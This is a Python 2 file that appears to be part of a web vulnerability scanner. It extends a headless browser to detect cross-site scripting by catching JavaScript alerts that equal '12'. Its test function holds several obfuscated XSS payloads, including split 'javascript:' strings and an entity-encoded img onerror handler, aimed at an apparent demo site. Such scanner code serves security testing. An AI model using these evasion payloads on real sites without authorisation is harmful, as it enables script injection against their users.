#!/usr/bin/env python
# encoding=utf-8

import os
import sys
import time
from urllib import unquote
import urlparse
import spynner
from PyQt4.QtCore import QByteArray, QUrl, qDebug
from PyQt4.QtNetwork import QNetworkAccessManager, QNetworkRequest,QNetworkReply,QNetworkProxy

# Debug levels
ERROR, WARNING, INFO, DEBUG = range(4)

class MyBrowser(spynner.Browser):
	def __init__(self,
				 qappargs=None,
				 debug_level=ERROR,
				 want_compat=False,
				 embed_jquery=False,
				 embed_jquery_simulate=False,
				 additional_js_files = None,
				 jslib = None,
				 download_directory = ".",
				 user_agent = None,
				 debug_stream = sys.stderr,
				 event_looptime = 0.01 ,
				 ignore_ssl_errors = True,
				 headers = None,
				 referer = '',
				 cookie = '',
				 proxy = {}
				 ):
		jslib="jq"
		#want_compat=True
		#embed_jquery=True
		#embed_jquery_simulate=True
		super(MyBrowser,self).__init__(qappargs=qappargs,
									   debug_level=debug_level,
									   want_compat=want_compat,
									   embed_jquery=embed_jquery,
									   embed_jquery_simulate=embed_jquery_simulate,
									   additional_js_files = additional_js_files,
									   jslib = jslib,
									   download_directory = download_directory,
									   user_agent = user_agent,
									   debug_stream = debug_stream,
									   event_looptime = event_looptime,
									   ignore_ssl_errors = ignore_ssl_errors
									   )
		self.ret = False
		self.referer = referer or ''
		self.user_agent = user_agent or 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1'
		self.cookie = cookie or ''
		self.proxy = proxy or {}			
		self.headers = headers
		self.reply_status = None
		self._setQtProxy()

	def _javascript_alert(self, webframe, message):
		self._debug(INFO, "Javascript alert: %s" % message)
		print "alert: ", message
		if str(message) == "12":
			self.ret = True

	def _javascript_console_message(self, message, line, sourceid):
		print "line:", line
		print "message: ", message
		print "sourceid: ", sourceid
		if line:
			self._debug(INFO, "Javascript console (%s:%d): %s" %
				(sourceid, line, message))
		else:
			self._debug(INFO, "Javascript console: %s" % message)
		if str(message) == "12":
			self.ret = True		

	def _javascript_confirm(self, webframe, message):
		self._debug(INFO, "Javascript confirm: %s" % message)
		print "confirm: ", message
		if str(message) == "12":
			self.ret = True
		return True

	def _javascript_prompt(self, webframe, message, defaultvalue, result):
		self._debug(INFO, "Javascript prompt: %s" % message)
		print "prompt: ", message
		if str(message) == "12":
			self.ret = True
		return True

	def _setQtProxy(self):

			proxy_str = ''

			if self.proxy.has_key('http'):
					proxy_str = self.proxy['http']
			elif self.proxy.has_key('https'):
					proxy_str = self.proxy['https']
			if proxy_str != '':
					p = urlparse.urlparse(proxy_str)
					proxy = QNetworkProxy(QNetworkProxy.HttpProxy, p.hostname, p.port)
					QNetworkProxy.setApplicationProxy(proxy)
					
	#def _make_request(self, url):
	#	request = QNetworkRequest()
	#	request.setUrl(QUrl(url))
	#	return request
	def _make_request(self, url):
		
		url = QUrl.fromEncoded(url, QUrl.TolerantMode)
		#url = QUrl(url, QUrl.StrictMode)
		#url = QUrl.setUrl(url, QUrl.StrictMode)
		request = QNetworkRequest(url)
		#request = QNetworkRequest(url)
		return request

	def _urlencode_post_data(self, post_data):
		post_params = QUrl()
		for (key, value) in post_data.items():
			post_params.addQueryItem(key, unicode(value)) 
		return post_params.encodedQuery()
	
	def _on_reply(self, reply):
		if reply.error():
			self.errorCode = reply.error()
			self.errorMessage = reply.errorString()
			if reply.error() == 203:
				self.reply_status = 404
			elif reply.error() == 301:
				pass			   
		else:
			self.reply_status = 200

	#def click(self, selector, wait_load=False, wait_requests=None, timeout=None):
	#	"""
	#	Click any clickable element in page.

	#	@param selector: jQuery selector.
	#	@param wait_load: If True, it will wait until a new page is loaded.
	#	@param timeout: Seconds to wait for the page to load before
	#								   raising an exception.
	#	@param wait_requests: How many requests to wait before returning. Useful
	#						  for AJAX requests.

	#	By default this method will not wait for a page to load.
	#	If you are clicking a link or submit button, you must call this
	#	method with C{wait_load=True} or, alternatively, call
	#	L{wait_load} afterwards. However, the recommended way it to use
	#	L{click_link}.

	#	When a non-HTML file is clicked this method will download it. The
	#	file is automatically saved keeping the original structure (as
	#	wget --recursive does). For example, a file with URL
	#	I{http://server.org/dir1/dir2/file.ext} will be saved to
	#	L{download_directory}/I{server.org/dir1/dir2/file.ext}.
	#	"""
	#	if not self.embed_jquery_simulate:
	#		print 'no jquery for click...'
	#		return self.wk_click(selector,
	#							 wait_load=wait_load,
	#							 wait_requests=wait_requests,
	#							 timeout=timeout)
	#	jscode = "%s('%s').simulate('click');" % (self.jslib, selector)
	#	self._replies = 0
	#	self._runjs_on_jquery("click", jscode)
	#	self.wait_requests(wait_requests)
	#	if wait_load:
	#		return self._wait_load(timeout)

	def self_mouseEvents_element(self, element, event_name, wait_load=False, wait_requests=None, timeout=None):
		"""
		mouse event name:  ?¡®click¡¯,?¡®mousedown¡¯,?¡®mousemove¡¯,?¡®mouseout¡¯,?¡®mouseover¡¯,?¡®mouseup¡¯
		"""
		# print 'do mouse event: %s' % event_name
		jscode = (
			"var e = document.createEvent('MouseEvents');"
			"e.initEvent( '%s', true, true );" 
			"this.dispatchEvent(e);"
		) % event_name
		element.evaluateJavaScript(jscode)
		time.sleep(0.5)
		self.wait_requests(wait_requests)
		if wait_load:
			return self._wait_load(timeout)

	def self_do_mouseEvents(self, selector, event_name, wait_load=False, wait_requests=None, timeout=None):
		element = self.webframe.findFirstElement(selector)
		return self.self_mouseEvents_element(element, event_name, wait_load=wait_load, wait_requests=wait_requests, timeout=timeout)
		
	def attack(self, url, method='GET', post_data=dict(), headers={},tid=0):
		#url = unquote(url)
		request = self._make_request(url)
		#print request.url()
		#qDebug(request.url().toString())
		if headers:
			for k, v in headers.items():
				request.setRawHeader(k, str(v))  
		if method == 'GET':
			# if request.hasRawHeader('Referer'):
			# 	print '.............Ok,find Referer in headers...'
			# else:
			# 	print ".............Referer not set in headers" 
			self.webframe.load(request)
			# print 'loading...'
			self._wait_load(timeout=15)
			# print 'over....'	
			
		elif method == 'POST':
			# print 'browser.attack.POST...'
			# print '.......browser.py post_data is:',post_data
			encoded_data = self._urlencode_post_data(post_data)
			#print '.......browser.py encoded_data is:',encoded_data
			request.setRawHeader('Content-Type', QByteArray('application/x-www-form-urlencoded'))
			self.webframe.load(request, QNetworkAccessManager.PostOperation, encoded_data)
			# print 'loading...'
			self._wait_load(timeout=15)
			# print 'over....'
		else:
			print 'something is not right here....'
			pass

	#def lfi_attack(self, url, method='GET', post_data=dict(), headers={},tid=0):
        #        #url = unquote(url)
        #        request = self._make_request(url)
        #        #print request.url()
        #        #qDebug(request.url().toString())
        #        if headers:
        #                for k, v in headers.items():
        #                        request.setRawHeader(k, str(v))
        #        if method == 'GET':
        #                # if request.hasRawHeader('Referer'):
        #                #       print '.............Ok,find Referer in headers...'
        #                # else:
        #                #       print ".............Referer not set in headers" 
        #                self.webframe.load(request)
        #                # print 'loading...'
        #                self._wait_load(timeout=15)
        #                # print 'over....'      
	#
        #        elif method == 'POST':
        #                # print 'browser.attack.POST...'
        #                # print '.......browser.py post_data is:',post_data
        #                encoded_data = self._urlencode_post_data(post_data)
        #                #print '.......browser.py encoded_data is:',encoded_data
        #                request.setRawHeader('Content-Type', QByteArray('application/x-www-form-urlencoded'))
        #                self.webframe.load(request, QNetworkAccessManager.PostOperation, encoded_data)
        #                # print 'loading...'
        #                self._wait_load(timeout=15)
        #                # print 'over....'
        #        else:
        #                print 'something is not right here....'
        #                pass

	def self_event_attack(self):
		# print 'onmouseover...'
		self.self_do_mouseEvents("[pig=dog]", 'mouseover')
		# print 'onclick...'
		self.self_do_mouseEvents("[pig=dog]", 'click')
	
	# def _wait_load(self, timeout=None):
	# 	self._events_loop(0.0)
	# 	if self._load_status is not None:
	# 		load_status = self._load_status
	# 		self._load_status = None
	# 		return load_status
	# 	itime = time.time()
	# 	while self._load_status is None: 
	# 		#print '_wait_load() while loop..'
	# 		if timeout and time.time() - itime > timeout:
	# 			print "Timeout reached: %d seconds" % timeout
	# 			break
	# 			#raise SpynnerTimeout("Timeout reached: %d seconds" % timeout)
	# 		self._events_loop(0.1)
	# 	self._events_loop(0.0)
	# 	if self._load_status:
	# 		self.load_js()
	# 		self.webpage.setViewportSize(self.webpage.mainFrame().contentsSize())
	# 	load_status = self._load_status
	# 	self._load_status = None
	# 	return load_status

	def _wait_load(self, timeout=None):
		self._events_loop(0.0)
		if self._load_status is not None:
			load_status = self._load_status
			self._load_status = None
			return load_status
		itime = time.time()
		while self._load_status is None:
			if timeout and time.time() - itime > timeout:
				print "Timeout reached: %d seconds" % timeout
	 			break
			self._events_loop()
		self._events_loop(0.0)
		if self._load_status:
			self.load_js()
			self.webpage.setViewportSize(self.webpage.mainFrame().contentsSize())
		load_status = self._load_status
		self._load_status = None
		return load_status
					 
	def _get_filepath_for_url(self, url, reply=None):
		urlinfo = urlparse.urlsplit(url)
		if urlinfo.port:
			path = os.path.join(os.path.abspath(self.download_directory), urlinfo.hostname+"_"+str(urlinfo.port))
		else:
			path = os.path.join(os.path.abspath(self.download_directory), urlinfo.hostname)
		if urlinfo.path != '/':
			p = urlinfo.path
			if len(p) > 2:
				if p[0] == '/':
					p = p[1:]
			path = os.path.join(path, p)
		if reply.hasRawHeader('content-disposition'):
			cd = '%s' % reply.rawHeader('content-disposition')
			pattern = 'attachment;filename=(.*)'
			if re.match(pattern, cd):
				filename = re.sub('attachment;filename=(.*)', '\\1', cd)
				path = os.path.join(path, filename)
		if not os.path.isdir(os.path.dirname(path)):
			os.makedirs(os.path.dirname(path))
		if path is None:
			raise SpynnerError('Download mode is unknown, can\'t determine the final filename')
		return path	 
		


def test():
	#url = 'http://demo.aisec.cn/demo/aisec/js_link.php?msg=abc\'>+%%26%23101;<sCRipt>location=\'jAvas\'%2b\'Cript:ale\'%2b\'rt%2\'%2b\'812%2\'%2b\'9\'</sCrIpT>%%26%23%<kid var=\'&id=1'
	#url = 'http://demo.aisec.cn/demo/aisec/js_link.php?msg=abc%27><sCRipt>location=%27jAvasCript:alert%2812%29%27</sCrIpT><kid var=%27&id=1'
	#url = 'http://demo.aisec.cn/demo/aisec/js_link.php?msg=abc\'><input type=text autofocus onfocus=location=\'jAvas\'%252b\'Cript:ale\'%252b\'rt%2\'%252b\'812%2\'%252b\'9\'><input var=\'&id=1'
	url = 'http://demo.aisec.cn/demo/aisec/js_link.php?msg=abc%27><iMg src=%27pigdog%27onerror=%26%23108;%26%23111;%26%2399;%26%2397;%26%23116;%26%23105;%26%23111;%26%23110;%26%2361;%26%2339;%26%23106;%26%2365;%26%23118;%26%2397;%26%23115;%26%2339;%26%2343;%26%2339;%26%2367;%26%23114;%26%23105;%26%23112;%26%23116;%26%2358;%26%2397;%26%23108;%26%23101;%26%2339;%26%2343;%26%2339;%26%23114;%26%23116;%26%2337;%26%2350;%26%2339;%26%2343;%26%2339;%26%2356;%26%2349;%26%2350;%26%2337;%26%2350;%26%2339;%26%2343;%26%2339;%26%2357;%26%2339;><kid var=%27&id=1'
	#url = 'http://demo.aisec.cn/demo/aisec/js_link.php?msg=abc%27%3E%3Cinput%20type=text%20autofocus%20onfocus=location=%22jAvas%22%2b%22Cript:ale%22%2b%22rt%2%22%2b%22812%2%22%2b%229%22%3E%3Cinput%20var=%27&id=1'
	print url
	method = 'GET'
	data = {}
	#data = 'keyword='
	refer = ''
	user_agent = ''   
	br = MyBrowser()
	br.attack(url,method,data)
	print br.ret
	print br.html

if __name__=='__main__':
	test()
